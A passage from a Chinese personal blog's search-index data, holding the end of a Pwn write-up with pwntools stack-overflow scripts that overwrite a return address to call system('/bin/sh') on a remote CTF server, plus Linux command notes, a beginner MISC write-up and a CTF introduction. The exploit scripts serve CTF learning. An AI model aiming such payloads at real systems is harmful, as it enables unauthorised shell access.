0x400596 // 函数在栈中的位置payload = b&#x27;a&#x27; * (0x80 + 0x08) + p64(callsystem) // 使程序最终运行后门函数io = sendline(payload)io.interactive() 运行脚本，结果如下，成功控制服务器，寻找、查看flag即可。 四、level2 (level1去哪了???)在做完看不见的level1之后，我们来到了level2🐶 首先，查看一下文件的信息与保护措施 32位可执行程序，只开启了NX，因此不能直接使用shellcode，但是可以进行栈溢出，构建ROP链。 拖进ida查看一下 很好，有system函数和/bin/sh字符串，应该不需要自己构建了，溢出覆盖即可，接下来查看函数 main函数如下： 接着查看vulnerable_function函数： 这里存在明显可以发生栈溢出的状况，到这一步，我们的思路基本上确定了，通过溢出覆盖构造一个system(“/bin/sh”)的伪栈帧，vulnerable_function()执行结束后返回到我们构造的伪栈帧去执行system(“bin/sh”)，这样就可以获取shell。 上linux！ 首先查找system函数和/bin/sh/字节的地址（这里刚学习使用elf直接查找，用ida也可以） 接下来就是编写脚本了，具体思路就是： 将返回地址覆盖为system函数，再将system函数引向/bin/sh字节，脚本如下 12345678910111213from pwn import *io = remote(&#x27;地址&#x27;, 端口)sys_addr = 0x8048320bin_addr = 0x804a024payload = b&#x27;a&#x27; * (0x88 + 0x04) + p32(sys_addr) + p32(0) + p32(bin_addr)io.sendline(payload)io.interactive() 其中的p32(0) ，是为了栈平衡，覆盖函数的返回地址，system的参数实际上是两字节后的/bin/sh。","categories":[],"tags":[{"name":"人生苦短，我学Pwn","slug":"人生苦短，我学Pwn","permalink":"https://0410wzn.top/tags/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8C%E6%88%91%E5%AD%A6Pwn/"}]},{"title":"linux学习札记","slug":"linux学习札记","date":"2021-10-20T15:35:51.000Z","updated":"2021-10-23T16:17:49.911Z","comments":true,"path":"2021/10/20/linux学习札记/","link":"","permalink":"https://0410wzn.top/2021/10/20/linux%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/","excerpt":"","text":"本学习札记立足于笔者入门linux系统命令学习时，通过OverTheWise的战争游戏，经查询、做题实践后写出，不足之处还请多多见谅。 1、pwd pwd命令常用于得知操作者目前所在的目录名称。 2、ls ls命令用于显示目前操作者所在目录之下的内容 -a 显示所有文件及目录 (. 开头的隐藏文件也会列出) -l 除文件名称外，亦将文件型态、权限、拥有者、文件大小等资讯详细列出 -r 将文件以相反次序显示(原定依英文字母次序) -t 将文件依建立时间之先后次序列出 -A 同 -a ，但不列出 “.” (目前目录) 及 “..” (父目录) -F 在列出的文件名称后加一符号；例如可执行档则加 “*”, 目录则加 “/“ -R 若目录下有文件，则以下之文件亦皆依序列出 3、 cat cat命令用于连接文件并打印到标准输出设备上 -n 或 —number**：由 1 开始对所有输出的行数编号。 -b 或 —number-nonblank**：和 -n 相似，只不过对于空白行不编号 -s 或 —squeeze-blank**：当遇到有连续两行以上的空白行，就代换为一行的空白行 -v 或 —show-nonprinting**：使用 ^ 和 M- 符号，除了 LFD 和 TAB 之外 -E 或 —show-ends : 在每行结束处显示 $ -T 或 —show-tabs: 将 TAB 字符显示为 ^I -A, —show-all：等价于 -vET -e：**等价于”-vE”选项 -t：**等价于”-vT”选项 例： 4、 file file命令通常用来查看辨别文件命名，与呆板的windows不同，linux不是通过文件后缀名去判断文件为何，而是通过判断文件的文件头来判断的，因此linux可以准确地判断文件为何种类型。 -b 列出辨识结果时，不显示文件名称 -c 详细显示指令执行过程，便于排错或分析程序执行的情形 -f &lt;名称文件&gt; 指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称 -L 直接显示符号连接所指向的文件的类别 -m &lt;魔法数字文件&gt; 指定魔法数字文件 -v 显示版本信息 -z 尝试去解读压缩文件的内容 [文件或目录…] 要确定类型的文件列表，多个文件之间使用空格分开，可以使用shell通配符匹配多个文件 例： 5、 find find一般用来查找指定目录下的文件，如果未加参数，则会将查到的子目录与文件全部显示。 由于参数过多，下面只列出较为常用的部分： -mount, -xdev : 只检查和指定目录在同一个文件系统下的文件，避免列出其它文件系统中的文件 -amin n : 在过去 n 分钟内被读取过 -anewer file : 比文件 file 更晚被读取过的文件 -atime n : 在过去n天内被读取过的文件 -cmin n : 在过去 n 分钟内被修改过 -cnewer file :比文件 file 更新的文件 -ctime n : 在过去n天内被修改过的文件 -empty : 空的文件-gid n or -group name : gid 是 n 或是 group 名称是 name -ipath p, -path p : 路径名称符合 p 的文件，ipath 会忽略大小写 -name name, -iname name : 文件名称符合 name 的文件。iname 会忽略大小写 -size n : 文件大小 是 n 单位，b 代表 512 位元组的区块，c 表示字元数，k 表示 kilo bytes，w 是二个位元组。 -type c : 文件类型是 c 的文件。 d: 目录 c: 字型装置文件 b: 区块装置文件 p: 具名贮列 f: 一般文件 l: 符号连结 s: socket -pid n : process id 是 n 的文件 例：（这里与下一命令size一起列出）","categories":[],"tags":[{"name":"Linux命令入门","slug":"Linux命令入门","permalink":"https://0410wzn.top/tags/Linux%E5%91%BD%E4%BB%A4%E5%85%A5%E9%97%A8/"}]},{"title":"攻防世界MISC新手题部分WP(更新ing)","slug":"攻防世界MISC新手题部分WP-更新ing","date":"2021-10-10T00:34:06.000Z","updated":"2021-10-29T08:51:16.920Z","comments":true,"path":"2021/10/10/攻防世界MISC新手题部分WP-更新ing/","link":"","permalink":"https://0410wzn.top/2021/10/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMISC%E6%96%B0%E6%89%8B%E9%A2%98%E9%83%A8%E5%88%86WP-%E6%9B%B4%E6%96%B0ing/","excerpt":"","text":"攻防世界Misc新手题WP 地址：https://adworld.xctf.org.cn/task/task_list?type=misc&amp;number=1&amp;grade=0 一、PDF 菜猫给了菜狗一张图，说图下面什么都没有 因为题目里明显提示了“下面”，我们自然便能想到文件“下面”藏着什么，其一可能在图片下面藏有信息，其二可能藏有其它文件，于是开始逐步尝试。 首先，我们查看其属性，发现并没有什么隐藏信息，于是开始研究图片下面。 通过办公软件，我们将pdf文件转换成word文档，以此来从物理上观察图片下的信息。 当我们打开word文档，我们惊奇的发现，flag已经明显出现在眼前了！ 复制粘贴结束。 二、give_you_flag 菜狗找到了文件中的彩蛋很开心，给菜猫发了个表情包 下载附件后，看到如下动图。 ​ .gif) 题目中提到“文件中的”彩蛋“，所以文件中肯定有一些信息，而一张动图，是由多张静止图片组合成的，由 此想到，运用stegsolve一帧一帧的看，发现一面的一帧藏有信息—一张二维码！！！ 我们使用分帧工具将图片提取出来，得到带有二维码的图片 ​ 很明显，这个二维码缺少定位角，找到定位角用图片编辑工具补上即可。补完后，扫码，flag出现。","categories":[],"tags":[{"name":"入门","slug":"入门","permalink":"https://0410wzn.top/tags/%E5%85%A5%E9%97%A8/"}]},{"title":"CTF简介","slug":"CTF简介","date":"2021-10-09T13:57:31.000Z","updated":"2021-10-29T08:50:20.255Z","comments":true,"path":"2021/10/09/CTF简介/","link":"","permalink":"https://0410wzn.top/2021/10/09/CTF%E7%AE%80%E4%BB%8B/","excerpt":"","text":"一、CTF简介 Capture The Flag（以下简称”CTF”）,顾名思义，即是夺取旗帜，由于相关介绍已经比较完全完全，其简介可见百度知道:CTF词条。 CTF 二、CTF的题目类型​ CTF的题目类型大致包括以下五种： Web，Pwn，Misc， Reverse，Crypto Web​ Web类题目大部分情况下和网、Web、HTTP等相关技能有关。主要考察选手对于Web攻防的一些知识技巧。诸如SQL注入、XSS、代码执行、代码审计等等都是很常见的考点。一般情况下Web题目只会给出一个能够访问的URL。部分题目会给出附件. Pwn​ Pwn类题目重点考察选手对于二进制漏洞的挖掘和利用能力，其考点也通常在堆栈溢出、格式化漏洞、UAF、Double Free等常见二进制漏洞上。选手需要根据题目中给出的二进制可执行文件进行逆向分析，找出其中的漏洞并进行利用，编写对应的漏洞攻击脚本(Exploit)，进而对主办方给出的远程服务器进行攻击并获取flag通常来说Pwn类题目给出的远程服务器信息为nc IP_ADDRESS PORT，例如nc 1.2.3.4 4567这种形式，表示在1.2.3.4这个IP的4567端口上运行了该题目 MiscMisc意为杂项，即不包含在以上分类的题目都会放到这个分类。题目会给出一个附件。选手下载该附件进行分析，最终得出flag 常见的题型有图片隐写、视频隐写、文档隐写、流量分析、协议分析、游戏、IoT相关等等。五花八门，种类繁多。 Reverse​ Reverse题目考察选手逆向工程能力。题目会给出一个可执行二进制文件，有些时候也可能是Android的APK安装包。选手需要逆向给出的程序，分析其程序工作原理。最终根据程序行为等获得flag。 Crypto​ Crypto类题目考察选手对密码学相关知识的了解程度，诸如RSA、AES、DES等都是密码学题目的常客。有些时候也会给出一个加密脚本和密文，根据加密流程逆推出明文。 三、CTF的比赛形式 CTF的比赛形式主要包括以下几种：理论类，Jeopardy-解题，AwD-攻防，RHG-自动化，RW-真实世界，KoH-抢占山头，MIX-混合 理论类​ 理论题多见于国内比赛，通常为选择题。包含单选及多选，选手需要根据自己所学的相关理论知识进行作答。最终得出分数。理论部分通常多见于初赛或是初赛之前的海选 Jeopardy-解题​ 参赛队伍可以通过互联网或者现场网络参与，参数队伍通过与在线环境交互或文件离线分析，解决网络安全技术挑战获取相应分值，类似于 ACM 编程竞赛、信息学奥林匹克赛，根据总分和时间来进行排名。 不同的是这个解题模式一般会设置 一血(First Blood) 、 二血(Second Blood) 、 三血(Third Blood) ，也即最先完成的前三支队伍会获得额外分值，所以这不仅是对首先解出题目的队伍的分值鼓励，也是一种团队能力的间接体现。 当然还有一种流行的计分规则是设置每道题目的初始分数后，根据该题的成功解答队伍数，来逐渐降低该题的分值，也就是说如果解答这道题的人数越多，那么这道题的分值就越低。最后会下降到一个保底分值后便不再下降。一般称之为动态积分 题目类型主要包含 Web 网络攻防 、 RE 逆向工程 、 Pwn 二进制漏洞利用 、 Crypto 密码攻击以及 Misc 安全杂项 这五个类别，个别比赛会根据题目类型进行扩展。 AwD-攻防​ Attack with Defense(AwD)全称攻防模式，在攻防模式CTF赛制中，参赛队伍连接到同一个网络空间。主办方会预先为每个参赛队分配要防守的主机，该主机称之为GameBox，每个队伍之间的GameBox配置及漏洞是完全一致的，选手需要防护自己的GameBox不被攻击的同时挖掘漏洞并攻击对手服务来得分。在AwD中主办方会运行一个名为Checker的程序定时检测选手的GameBox的运行状态。若检测到状态不对则判定该GameBox宕机，按照规则扣除一定分数。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续24至48小时左右），同时也比团队之间的分工配合与合作。 AwD通常仅包含Web及Pwn两种类型的题目。每个队伍可能会分到多个GameBox，随着比赛的进行，最早的GameBox可能会下线，同时会上线新的GameBox。 RHG-自动化​ Robo Hacking Game(RHG)该利用人工智能或是AI或是自动化攻击程序来全自动的挖掘并利用漏洞，考验选手对于漏洞理解以及工程化能力。比赛开始前(一般为1-4周左右)主办方会给出测试环境以及相关接口文档。选手需要编写自动化程序来请求接口获取题目相关信息，该类程序通常称之为bot，在程序中全自动访问并挖掘目标漏洞，完成利用漏洞攻击并获取flag的过程。获取到的flag也由程序自动化提交。RHG因为是由bot全自动进行工作，所以比赛开始即可视为结束。剩下的一切全看参赛选手编写的自动化bot的工作情况。 比赛过程中不允许选手对bot进行任何的操作(包括debug/patch等等)。选手仅能看到自己的bot完成了哪些题。目前的得分情况等等。 RW-真实世界​ Real World(RW) 首次于2018年长亭科技主办的RealWorldCTF中出现，该赛制着重考察选手在面对真实的环境下的漏洞挖掘与利用能力。通常RW模式出题也会围绕着能够应用于真实渗透攻击当中的漏洞，一般来说RW常见题型为VM/Docker逃逸、针对浏览器的攻击、针对IoT/Car等设备的攻击，Web类攻击等等 在RW赛制中会有一个Show Time，当选手认为自己已经可以完成题目时，选手可以在比赛平台上提交展示申请，由工作人员根据申请先后顺序进行展示排期。选手展示之前需要上台并连接相关网络，同时现场大屏会切换至目标的正常页面。选手确认连接并测试OK之后开始计时。一般情况下上台攻击的时间为5分钟，选手一旦完成攻击现场大屏幕会实时看到攻击的效果，此时裁判会根据效果是否符合题目要求来判定该题是否完成。如5在攻击时间内依然未能看到展示效果则认为本次攻击失败。现如今为了防止选手恶意排期。通常会有一个队伍总展示次数(例如在2019年数字经济云安全公测大赛中每个队伍只允许上台展示30次)，选手也需要尽可能保证上台之后攻击的成功率 举个例子。题目要求需要攻击位于比赛网络中的某个网站并将首页替换为包含队伍名称的页面。题目给出该网站的一些信息(源代码/数据库等等)，选手经过本地挖掘漏洞之后，提交展示申请，排期到了之后进行上台展示。注意，因为RW模式是以展示效果来作为题目是否完成的准则，所以在RW模式中并不存在Flag。 KoH-抢占山头​ King of Hill(KoH)是近些年新衍生的一种赛制。该赛制有点类似于AwD，但是又和AwD有些不一样。选手面对的是一个黑盒的目标，需要先挖掘漏洞并利用漏洞控制目标。将自己的队伍标识(队伍名称或是Token之类)写入到指定文件。随后在该主机上进行加固等操作防止其他队伍攻击，主办方会定期去检查标识文件，根据文件中的队伍标识来判定本回合分数给予哪个队伍。可以看出KoH也是一种对抗极为激烈的赛制，同时考察选手的渗透能力及防御加固能力。 Mix-混合​ 混合模式结合了以上多种模式，现如今单一的赛制已经无法满足比赛及选手的参赛需求，所以大部分比赛会同时以多个模式进行比赛。例如参赛队伍通过解题(Jeopardy)可以获取一些初始分数，然后通过攻防对抗(AwD)进行得分增减的零和游戏，最终以得分高低分出胜负。","categories":[],"tags":[{"name":"萌新","slug":"萌新","permalink":"https://0410wzn.top/tags/%E8%90%8C%E6%96%B0/"}]}],"categories":[],"tags":[{"name":"Deep_Learning","slug":"Deep-Learning","permalink":"https://0410wzn.top/tags/Deep-Learning/"},{"name":"React","slug":"React","permalink":"https://0410wzn.top/tags/React/"},{"name":"STL","slug":"STL","permalink":"https://0410wzn.top/tags/STL/"},{"name":"Pwn入门","slug":"Pwn入门","permalink":"https://0410wzn.top/tags/Pwn%E5%85%A5%E9%97%A8/"},{"name":"MISC","slug":"MISC","permalink":"https://0410wzn.top/tags/MISC/"},{"name":"人生苦短，我学Pwn","slug":"人生苦短，我学Pwn","permalink":"https://0410wzn.top/tags/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8C%E6%88%91%E5%AD%A6Pwn/"},{"name":"Linux命令入门","slug":"Linux命令入门","permalink":"https://0410wzn.top/tags/Linux%E5%91%BD%E4%BB%A4%E5%85%A5%E9%97%A8/"},{"name":"入门","slug":"入门","permalink":"https://0410wzn.top/tags/%E5%85%A5%E9%97%A8/"},{"name":"萌新","slug":"萌新","permalink":"https://0410wzn.top/tags/%E8%90%8C%E6%96%B0/"}]}